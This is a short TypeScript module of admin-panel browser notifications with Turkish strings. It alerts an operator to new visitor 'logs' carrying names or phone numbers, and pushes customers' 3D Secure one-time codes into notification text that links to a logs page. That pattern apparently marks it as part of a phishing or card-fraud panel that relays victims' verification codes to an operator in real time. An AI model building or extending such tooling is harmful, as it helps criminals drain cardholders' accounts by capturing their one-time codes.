export async function requestAdminNotificationPermission(): Promise<boolean> {
  if (typeof window === 'undefined' || !('Notification' in window)) {
    return false;
  }
  if (Notification.permission === 'granted') {
    return true;
  }
  if (Notification.permission === 'denied') {
    return false;
  }
  const result = await Notification.requestPermission();
  return result === 'granted';
}

export function showAdminNotification(title: string, body: string, tag: string) {
  if (typeof window === 'undefined' || !('Notification' in window)) {
    return;
  }
  if (Notification.permission !== 'granted') {
    return;
  }

  try {
    const notification = new Notification(title, {
      body,
      tag,
      silent: false,
      requireInteraction: false,
    });

    notification.onclick = () => {
      window.focus();
      window.location.href = '/admin/logs';
      notification.close();
    };

    setTimeout(() => notification.close(), 8000);
  } catch {
    // sessizce devam
  }
}

export function flashAdminTitle(message: string) {
  if (typeof document === 'undefined' || !document.hidden) {
    return;
  }
  const original = document.title;
  document.title = message;
  window.setTimeout(() => {
    document.title = original;
  }, 4000);
}

export function notifyNewLog(name?: string, phone?: string) {
  const label = name || phone || 'Yeni ziyaretçi';
  showAdminNotification('Yeni Log', `${label} — log ekranını kontrol edin`, 'admin-new-log');
  flashAdminTitle('🔔 Yeni Log');
}

export function notifyThreeDSecure(name?: string, code?: string) {
  const label = name || 'Müşteri';
  const body = code ? `${label} — 3D kod: ${code}` : `${label} — 3D Secure bekliyor`;
  showAdminNotification('3D Secure', body, 'admin-3d-secure');
  flashAdminTitle('🔐 3D Secure');
}
